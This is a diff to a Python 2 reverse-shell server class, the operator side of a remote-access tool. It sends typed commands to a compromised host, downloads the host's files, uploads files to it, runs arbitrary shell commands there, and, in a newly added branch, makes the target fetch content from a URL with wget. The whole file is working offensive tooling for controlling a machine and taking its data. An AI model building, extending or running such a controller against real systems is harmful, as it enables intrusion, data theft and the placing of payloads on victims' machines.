@@ -37,21 +37,33 @@ class reverse_shell_server:
         print "target = ",self.target, "ip = ",self.target_ip
         
         while True:
-            prompt  ="reverse_shell:@{}~# ".format(self.target_ip)
-            command = raw_input("reverse_shell:@{}~# ".format(self.target_ip))
+            prompt       = "reverse_shell:@{}~# ".format(self.target_ip)
+            command      = raw_input("reverse_shell:@{}~# ".format(self.target_ip))
             #self.reliable_send(command)
+            
             if command == "q" or command == "quit" or command == "exit":
                 self.reliable_send(command)
                 break
 
             elif len(command)>0 and command[:2] == "cd":
-                self.reliable_send(command)
-                print prompt+self.reliable_recv()
+                cmd_arg_list = command.split(" ")
+                command      = cmd_arg_list[0]
+                arguments    = cmd_arg_list[1:]
+                if len(arguments) > 1:
+                    print prompt+"[error]:too many arguments"
+                elif len(arguments) == 0:
+                    print prompt+"[error] Invalid command"
+                else:
+                    self.reliable_send(command + " " + arguments[0])
+                    print prompt+self.reliable_recv()
 
             elif len(command)>=8 and command[:8] == "download":
-                file_list = command.split(" ")
+                cmd_arg_list = command.split(" ")
+                command      = cmd_arg_list[0]
+                arguments    = cmd_arg_list[1:]
+                file_list    = arguments
                 if len(file_list)>1:
-                    for file_name in file_list[1:]:
+                    for file_name in file_list:
                         if not len(file_name) == 0:
                             self.reliable_send("download "+file_name)
                             with open(file_name, "wb") as downloaded_file:
@@ -59,11 +71,14 @@ class reverse_shell_server:
                         else:
                             print prompt+"error: no file name mentioned"
                 else:
-                    print prompt+"error: no file name mentioned"
+                    print prompt+"[error]: Invalid command"
             elif len(command)>=6 and command[:6] == "upload":
-                file_list = command.split(" ")
+                cmd_arg_list = command.split(" ")
+                command      = cmd_arg_list[0]
+                arguments    = cmd_arg_list[1:]
+                file_list    = arguments
                 if len(file_list)>1:
-                    for file_name in file_list[1:]:
+                    for file_name in file_list:
                         if not len(file_name) == 0:
                             self.reliable_send("upload "+file_name)
                             time.sleep(2)
@@ -76,13 +91,30 @@ class reverse_shell_server:
                                     print prompt+file_name+" uploaded sucessfully!"
                                 time.sleep(1)
                             except:
-                                print prompt+"error: failed to upload "+file_name
+                                print prompt+"[error]: failed to upload "+file_name
                                 self.reliable_send("failed")
                                 time.sleep(2)
                         else:
-                            print prompt+"error: no file name mentioned"
+                            print prompt+"[error]: no file name mentioned"
                 else:
-                    print prompt+"error: no file name mentioned"
+                    print prompt+"[error]: Invalid command"
+            elif command[:4] == "wget":
+                cmd_len      = len(command)
+                cmd_arg_list = command.split(" ")
+                command      = cmd_arg_list[0]
+                arguments    = cmd_arg_list[1:]
+                if len(arguments) >1:
+                    print prompt + "[error]: Invalid command"
+                elif len(arguments) ==0:
+                    if cmd_len == 4:
+                        print prompt + "[error]: missing URL"
+                        print "[usage]: wget [URL].."
+                    else:
+                        print prompt + "[error]: invalid command"
+                else:
+                    self.reliable_send(command + " " + arguments[0])
+                    print prompt + self.reliable_recv()
+
             else:
                 self.reliable_send(command)
                 output = self.reliable_recv()
